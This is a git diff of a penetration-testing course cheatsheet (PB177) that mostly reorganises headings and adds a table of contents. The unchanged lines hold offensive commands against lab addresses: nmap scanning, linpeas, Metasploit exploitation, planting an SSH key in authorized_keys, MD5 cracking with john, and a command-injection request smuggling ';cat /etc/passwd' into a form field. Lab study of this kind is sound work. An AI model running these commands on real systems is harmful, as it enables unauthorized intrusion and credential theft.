@@ -1,6 +1,6 @@
 # PB177 Cheatsheet
 
-## [Lab topics](./labs/README.md)
+## [Labs](./labs/README.md)
 
 ## Useful websites
 - vulnerability search
@@ -9,9 +9,18 @@
 - hash type identifier
 	- https://hashes.com/en/tools/hash_identifier
 
-# Strategy
+## Strategy & Commands
 
-## Scanning network
+- [Scanning network](#scanning-network)
+- [Searching vulnerabilities](#searching-vulnerabilities)
+- [Exploiting vulnerability](#exploiting-vulnerability)
+- [Password guessing](#password-guessing)
+- [Password cracking](#password-cracking)
+- [Command injection](#command-injection)
+- [Lateral movement](#lateral-movement)
+- [What to always check](#what-to-always-check)
+
+### Scanning network
 
 1. scan network for hosts
 ```sh
@@ -50,7 +59,7 @@ nmap --script=http-enum 10.0.66.201
 ping -c 1 10.0.0.254 && echo "Host is ONLINE" || echo "Host is OFFLINE"
 ```
 
-## Searching vulnerabilities
+### Searching vulnerabilities
 
 1. run linpeas
 ```sh
@@ -60,7 +69,7 @@ podman cp linpeas.sh attacker:~/linpeas.sh
 
 2. search anything sus with google
 
-## Exploiting vulnerability
+### Exploiting vulnerability
 
 1. search metasploit for exploit
 ```sh
@@ -78,7 +87,7 @@ show options
 check
 ```
 
-## Password guessing
+### Password guessing
 
 1. create a wordlist with AI (should be a small file)
 ```sh
@@ -100,7 +109,7 @@ ssh-keygen -t ed25519 -C "email@example.com"
 scp .ssh/id_ed25519.pub test@10.0.33.110:~/.ssh/authorized_keys
 ```
 
-## Password cracking
+### Password cracking
 
 1. save hash in file
 
@@ -111,7 +120,7 @@ scp .ssh/id_ed25519.pub test@10.0.33.110:~/.ssh/authorized_keys
 john --format=Raw-MD5 passwords.txt
 ```
 
-## Command injection
+### Command injection
 
 1. find out the request format
 
@@ -120,7 +129,7 @@ john --format=Raw-MD5 passwords.txt
 curl -s http://10.0.0.10:80/vulnerabilities/exec/ -X POST --data-raw 'ip=10.0.0.254;cat /etc/passwd&Submit=Submit' | lynx -nolist -dump -stdin
 ```
 
-## Lateral movement
+### Lateral movement
 
 1. check for more hosts on the system
 
@@ -128,7 +137,7 @@ curl -s http://10.0.0.10:80/vulnerabilities/exec/ -X POST --data-raw 'ip=10.0.0.
 
 3. collect info as you go
 
-## What to always check
+### What to always check
 
 - run Linpeas
 
